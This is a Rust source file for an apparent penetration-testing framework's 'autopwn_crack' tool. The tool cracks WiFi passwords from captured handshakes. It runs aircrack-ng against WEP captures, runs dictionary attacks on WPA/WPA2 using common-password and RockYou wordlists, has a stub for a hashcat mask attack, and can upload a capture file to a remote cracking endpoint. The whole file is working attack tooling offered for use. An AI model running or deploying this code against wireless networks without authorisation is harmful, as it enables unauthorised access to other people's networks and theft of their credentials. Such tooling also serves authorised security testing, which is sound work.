//! Password cracking tool for captured WiFi handshakes

use super::types::*;
use super::wordlist::{self, COMMON_PASSWORDS, ROCKYOU};
use async_trait::async_trait;
use pentest_core::error::{Error, Result};
use pentest_core::tools::*;
use serde_json::{json, Value};
use std::time::Instant;
use tokio::process::Command;

/// Crack captured WiFi passwords
pub struct AutoPwnCrackTool;

#[async_trait]
impl PentestTool for AutoPwnCrackTool {
    fn name(&self) -> &str {
        "autopwn_crack"
    }

    fn description(&self) -> &str {
        "Crack WiFi passwords from captured handshakes or IVs"
    }

    fn schema(&self) -> ToolSchema {
        ToolSchema::new(self.name(), self.description())
            .param(ToolParam::required(
                "capture_file",
                ParamType::String,
                "Path to capture file (.cap)",
            ))
            .param(ToolParam::required(
                "bssid",
                ParamType::String,
                "Target BSSID (MAC address)",
            ))
            .param(ToolParam::required(
                "security",
                ParamType::String,
                "Security type (WEP, WPA, WPA2)",
            ))
            .param(ToolParam::optional(
                "ssid",
                ParamType::String,
                "Target SSID (for display/logging)",
                json!(""),
            ))
            .param(ToolParam::optional(
                "method",
                ParamType::String,
                "Crack method: 'dictionary', 'mask', 'quick', or 'remote'",
                json!("quick"),
            ))
            .param(ToolParam::optional(
                "wordlist",
                ParamType::String,
                "Wordlist to use: 'rockyou', 'common', or path to custom wordlist",
                json!("rockyou"),
            ))
            .param(ToolParam::optional(
                "mask",
                ParamType::String,
                "Mask pattern for mask attack (e.g., '?u?l?l?l?l?d?d?d')",
                json!(null),
            ))
            .param(ToolParam::optional(
                "remote_endpoint",
                ParamType::String,
                "Remote cracking service endpoint URL",
                json!(null),
            ))
            .param(ToolParam::optional(
                "timeout",
                ParamType::Integer,
                "Timeout in seconds (0 = no timeout)",
                json!(300),
            ))
    }

    fn supported_platforms(&self) -> Vec<Platform> {
        vec![Platform::Desktop] // Linux only for now
    }

    async fn execute(&self, params: Value, _ctx: &ToolContext) -> Result<ToolResult> {
        execute_timed(|| async {
            // Parse parameters
            let capture_file = params["capture_file"]
                .as_str()
                .ok_or_else(|| Error::InvalidParams("capture_file is required".into()))?;

            let bssid = params["bssid"]
                .as_str()
                .ok_or_else(|| Error::InvalidParams("bssid is required".into()))?;

            let security = params["security"]
                .as_str()
                .ok_or_else(|| Error::InvalidParams("security is required".into()))?;

            let ssid = params["ssid"].as_str().unwrap_or("Unknown");
            let method = params["method"].as_str().unwrap_or("quick");
            let wordlist_name = params["wordlist"].as_str().unwrap_or("rockyou");
            let mask = params["mask"].as_str();
            let remote_endpoint = params["remote_endpoint"].as_str();
            let timeout_secs = params["timeout"].as_u64().unwrap_or(300);

            let sec_type = SecurityType::parse(security);

            tracing::info!("═══════════════════════════════════════════════════");
            tracing::info!("🔓 AutoPwn Crack Phase");
            tracing::info!("═══════════════════════════════════════════════════");
            tracing::info!("  Target:       {} ({})", ssid, bssid);
            tracing::info!("  Security:     {}", sec_type.as_str());
            tracing::info!("  Capture:      {}", capture_file);
            tracing::info!("  Method:       {}", method);
            if timeout_secs > 0 {
                tracing::info!("  Timeout:      {}s", timeout_secs);
            } else {
                tracing::info!("  Timeout:      None");
            }
            tracing::info!("───────────────────────────────────────────────────");

            // Verify capture file exists
            if !std::path::Path::new(capture_file).exists() {
                tracing::error!("✗ Capture file not found: {}", capture_file);
                tracing::error!("");
                tracing::error!("Next steps:");
                tracing::error!("  1. Verify the file path is correct");
                tracing::error!("  2. Check if the file was moved or deleted");
                tracing::error!("  3. Capture a new handshake with autopwn_scan");
                tracing::error!("");
                return Err(Error::InvalidParams(format!(
                    "Capture file not found: {}. See logs for next steps.",
                    capture_file
                )));
            }

            // Execute crack based on security type and method
            match sec_type {
                SecurityType::Wep => crack_wep(capture_file, bssid).await,
                SecurityType::Wpa | SecurityType::Wpa2 => match method {
                    "quick" => crack_wpa_quick(capture_file, bssid, timeout_secs).await,
                    "dictionary" => {
                        crack_wpa_dictionary(capture_file, bssid, wordlist_name, timeout_secs).await
                    }
                    "mask" => {
                        let pattern = mask.ok_or_else(|| {
                            Error::InvalidParams("mask parameter required for mask attack".into())
                        })?;
                        crack_wpa_mask(capture_file, bssid, pattern, timeout_secs).await
                    }
                    "remote" => {
                        let endpoint = remote_endpoint.ok_or_else(|| {
                            Error::InvalidParams(
                                "remote_endpoint parameter required for remote cracking".into(),
                            )
                        })?;
                        crack_wpa_remote(capture_file, bssid, ssid, endpoint).await
                    }
                    _ => Err(Error::InvalidParams(format!(
                        "Unknown crack method: {}",
                        method
                    ))),
                },
                _ => Err(Error::InvalidParams(format!(
                    "{} security not supported for cracking",
                    sec_type.as_str()
                ))),
            }
            .map(|result| json!(result))
        })
        .await
    }
}

/// Crack WEP key (fast, deterministic)
async fn crack_wep(capture_file: &str, bssid: &str) -> Result<CrackResult> {
    tracing::info!("");
    tracing::info!("🎯 WEP Key Cracking");
    tracing::info!("───────────────────────────────────────────────────");

    let start = Instant::now();

    tracing::info!("🔍 Analyzing capture...");

    let output = Command::new("aircrack-ng")
        .args(["-b", bssid, capture_file])
        .output()
        .await
        .map_err(|e| {
            tracing::error!("✗ Failed to run aircrack-ng: {}", e);
            tracing::error!("");
            tracing::error!("Next steps:");
            tracing::error!("  1. Install aircrack-ng:");
            tracing::error!("     sudo apt install aircrack-ng  (Debian/Ubuntu)");
            tracing::error!("     sudo pacman -S aircrack-ng    (Arch)");
            tracing::error!("     brew install aircrack-ng      (macOS)");
            tracing::error!("  2. Verify it's in PATH: which aircrack-ng");
            tracing::error!("");
            Error::ToolExecution(format!(
                "Failed to run aircrack-ng (not installed?): {}. See logs for next steps.",
                e
            ))
        })?;

    let stdout = String::from_utf8_lossy(&output.stdout);

    // Parse output for key
    for line in stdout.lines() {
        if line.contains("KEY FOUND!") {
            // Extract key from line like "KEY FOUND! [ AB:CD:EF:12:34 ]"
            if let Some(key_part) = line.split('[').nth(1) {
                if let Some(key) = key_part.split(']').next() {
                    let key = key.trim().to_string();
                    let duration = start.elapsed().as_secs();

                    tracing::info!("");
                    tracing::info!("✓ SUCCESS! WEP Key Found");
                    tracing::info!("───────────────────────────────────────────────────");
                    tracing::info!("  Key:      {}", key);
                    tracing::info!("  Time:     {}s", duration);
                    tracing::info!("═══════════════════════════════════════════════════");

                    return Ok(CrackResult {
                        success: true,
                        password: Some(key),
                        attempts: 1, // WEP is deterministic
                        duration_sec: duration,
                        method: "WEP Crack (aircrack-ng)".to_string(),
                    });
                }
            }
        }
    }

    tracing::warn!("✗ WEP key not found");
    tracing::warn!("   Possible reasons:");
    tracing::warn!("   • Not enough IVs captured (need ~40k)");
    tracing::warn!("   • Capture file corrupted");

    Ok(CrackResult {
        success: false,
        password: None,
        attempts: 0,
        duration_sec: start.elapsed().as_secs(),
        method: "WEP Crack (aircrack-ng)".to_string(),
    })
}

/// Quick WPA crack (try common passwords first)
async fn crack_wpa_quick(
    capture_file: &str,
    bssid: &str,
    timeout_secs: u64,
) -> Result<CrackResult> {
    tracing::info!("");
    tracing::info!("🎯 WPA Quick Crack (Common Passwords)");
    tracing::info!("───────────────────────────────────────────────────");

    // Try common passwords first (fast)
    tracing::info!("⚡ Trying common passwords (~100k)...");

    let wordlist_path = wordlist::ensure_wordlist(&COMMON_PASSWORDS).await?;

    let result = crack_with_wordlist(
        capture_file,
        bssid,
        wordlist_path.to_str().unwrap(),
        60, // 1 minute for common passwords
    )
    .await?;

    if result.success {
        return Ok(result);
    }

    // If not found and we have time, try rockyou
    if timeout_secs > 60 {
        tracing::info!("");
        tracing::info!("⏳ Trying full RockYou wordlist (~14M passwords)...");
        tracing::info!("   This may take several minutes...");

        let wordlist_path = wordlist::ensure_wordlist(&ROCKYOU).await?;

        crack_with_wordlist(
            capture_file,
            bssid,
            wordlist_path.to_str().unwrap(),
            timeout_secs - 60,
        )
        .await
    } else {
        Ok(result)
    }
}

/// Dictionary attack with specific wordlist
async fn crack_wpa_dictionary(
    capture_file: &str,
    bssid: &str,
    wordlist_name: &str,
    timeout_secs: u64,
) -> Result<CrackResult> {
    tracing::info!("");
    tracing::info!("🎯 WPA Dictionary Attack");
    tracing::info!("───────────────────────────────────────────────────");

    let wordlist_path = match wordlist_name {
        "rockyou" => wordlist::ensure_wordlist(&ROCKYOU).await?,
        "common" => wordlist::ensure_wordlist(&COMMON_PASSWORDS).await?,
        _ => {
            // Custom wordlist path
            let path = std::path::PathBuf::from(wordlist_name);
            if !path.exists() {
                return Err(Error::InvalidParams(format!(
                    "Wordlist not found: {}",
                    wordlist_name
                )));
            }
            tracing::info!("✓ Using custom wordlist: {}", wordlist_name);
            path
        }
    };

    crack_with_wordlist(
        capture_file,
        bssid,
        wordlist_path.to_str().unwrap(),
        timeout_secs,
    )
    .await
}

/// Crack with a specific wordlist
async fn crack_with_wordlist(
    capture_file: &str,
    bssid: &str,
    wordlist: &str,
    timeout_secs: u64,
) -> Result<CrackResult> {
    let start = Instant::now();

    tracing::info!("📖 Wordlist: {}", wordlist);
    tracing::info!("🔍 Cracking...");

    // Run aircrack-ng with timeout
    let child = Command::new("aircrack-ng")
        .args(["-w", wordlist, "-b", bssid, capture_file])
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .map_err(|e| {
            tracing::error!("✗ Failed to spawn aircrack-ng: {}", e);
            tracing::error!("");
            tracing::error!("Next steps:");
            tracing::error!("  1. Install aircrack-ng:");
            tracing::error!("     sudo apt install aircrack-ng  (Debian/Ubuntu)");
            tracing::error!("     sudo pacman -S aircrack-ng    (Arch)");
            tracing::error!("     brew install aircrack-ng      (macOS)");
            tracing::error!("  2. Verify it's in PATH: which aircrack-ng");
            tracing::error!("");
            Error::ToolExecution(format!(
                "Failed to spawn aircrack-ng (not installed?): {}. See logs for next steps.",
                e
            ))
        })?;

    // Get PID for killing if needed
    let child_id = child.id();

    // Wait with timeout
    let timeout = std::time::Duration::from_secs(timeout_secs);
    let result = tokio::time::timeout(timeout, child.wait_with_output()).await;

    let output = match result {
        Ok(Ok(output)) => output,
        Ok(Err(e)) => {
            return Err(Error::ToolExecution(format!("aircrack-ng failed: {}", e)));
        }
        Err(_) => {
            // Timeout - kill process
            if let Some(pid) = child_id {
                let _ = Command::new("kill").arg(pid.to_string()).output().await;
            }
            tracing::warn!("⏱ Timeout reached ({}s)", timeout_secs);

            return Ok(CrackResult {
                success: false,
                password: None,
                attempts: 0,
                duration_sec: start.elapsed().as_secs(),
                method: "Dictionary Attack (aircrack-ng)".to_string(),
            });
        }
    };

    let stdout = String::from_utf8_lossy(&output.stdout);

    // Parse output for key
    for line in stdout.lines() {
        if line.contains("KEY FOUND!") {
            // Extract password from line like "KEY FOUND! [ password123 ]"
            if let Some(key_part) = line.split('[').nth(1) {
                if let Some(password) = key_part.split(']').next() {
                    let password = password.trim().to_string();
                    let duration = start.elapsed().as_secs();

                    tracing::info!("");
                    tracing::info!("✓ SUCCESS! Password Found");
                    tracing::info!("═══════════════════════════════════════════════════");
                    tracing::info!("  Password: {}", password);
                    tracing::info!("  Time:     {}s", duration);
                    tracing::info!("═══════════════════════════════════════════════════");

                    return Ok(CrackResult {
                        success: true,
                        password: Some(password),
                        attempts: 0, // Can't easily track from aircrack-ng output
                        duration_sec: duration,
                        method: "Dictionary Attack (aircrack-ng)".to_string(),
                    });
                }
            }
        }
    }

    tracing::warn!("✗ Password not found in wordlist");

    Ok(CrackResult {
        success: false,
        password: None,
        attempts: 0,
        duration_sec: start.elapsed().as_secs(),
        method: "Dictionary Attack (aircrack-ng)".to_string(),
    })
}

/// Mask attack (requires hashcat)
async fn crack_wpa_mask(
    _capture_file: &str,
    _bssid: &str,
    mask: &str,
    _timeout_secs: u64,
) -> Result<CrackResult> {
    tracing::info!("");
    tracing::info!("🎯 WPA Mask Attack");
    tracing::info!("───────────────────────────────────────────────────");
    tracing::info!("  Mask: {}", mask);
    tracing::info!("");

    // Check if hashcat is available
    let hashcat_check = Command::new("which").arg("hashcat").output().await.ok();

    if hashcat_check.is_none() || !hashcat_check.unwrap().status.success() {
        tracing::error!("✗ Hashcat not found");
        tracing::error!("");
        tracing::error!("Next steps:");
        tracing::error!("  1. Install hashcat:");
        tracing::error!("     sudo apt install hashcat  (Debian/Ubuntu)");
        tracing::error!("     sudo pacman -S hashcat    (Arch)");
        tracing::error!("     brew install hashcat      (macOS)");
        tracing::error!("  2. Or use 'dictionary' method instead of 'mask'");
        tracing::error!("  3. Or use 'remote' method with a cracking service");
        tracing::error!("");
        return Err(Error::ToolExecution(
            "Mask attacks require hashcat (not installed). See logs for next steps.".into(),
        ));
    }

    // TODO: Convert cap to hc22000 format for hashcat
    // For now, return not implemented
    tracing::warn!("⚠ Mask attack not yet implemented");
    tracing::warn!("   Use 'dictionary' method or 'remote' cracking service");

    Ok(CrackResult {
        success: false,
        password: None,
        attempts: 0,
        duration_sec: 0,
        method: "Mask Attack (not implemented)".to_string(),
    })
}

/// Send handshake to remote cracking service
async fn crack_wpa_remote(
    capture_file: &str,
    bssid: &str,
    ssid: &str,
    endpoint: &str,
) -> Result<CrackResult> {
    tracing::info!("");
    tracing::info!("🎯 Remote Cracking Service");
    tracing::info!("───────────────────────────────────────────────────");
    tracing::info!("  Endpoint: {}", endpoint);
    tracing::info!("");

    let start = Instant::now();

    // Read capture file
    let capture_data = tokio::fs::read(capture_file)
        .await
        .map_err(|e| Error::ToolExecution(format!("Failed to read capture file: {}", e)))?;

    tracing::info!(
        "📤 Uploading handshake ({} KB)...",
        capture_data.len() / 1024
    );

    // Send to remote service
    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(30))
        .build()
        .map_err(|e| Error::Network(format!("Failed to create HTTP client: {}", e)))?;

    let response = client
        .post(endpoint)
        .header("Content-Type", "application/octet-stream")
        .header("X-BSSID", bssid)
        .header("X-SSID", ssid)
        .body(capture_data)
        .send()
        .await
        .map_err(|e| Error::Network(format!("Failed to upload handshake: {}", e)))?;

    if !response.status().is_success() {
        return Err(Error::Network(format!(
            "Remote service returned error: HTTP {}",
            response.status()
        )));
    }

    let result: serde_json::Value = response
        .json()
        .await
        .map_err(|e| Error::Network(format!("Failed to parse response: {}", e)))?;

    tracing::info!("✓ Handshake uploaded successfully");
    tracing::info!("");
    tracing::info!("Remote service response:");
    tracing::info!("{}", serde_json::to_string_pretty(&result).unwrap());

    // Parse response
    let success = result["success"].as_bool().unwrap_or(false);
    let password = result["password"].as_str().map(|s| s.to_string());
    let message = result["message"].as_str();

    if let (true, Some(ref pw)) = (success, &password) {
        tracing::info!("");
        tracing::info!("✓ SUCCESS! Password Found by Remote Service");
        tracing::info!("═══════════════════════════════════════════════════");
        tracing::info!("  Password: {}", pw);
        tracing::info!("═══════════════════════════════════════════════════");
    } else if let Some(msg) = message {
        tracing::info!("  Status: {}", msg);
    }

    Ok(CrackResult {
        success,
        password,
        attempts: 0,
        duration_sec: start.elapsed().as_secs(),
        method: format!("Remote Cracking ({})", endpoint),
    })
}
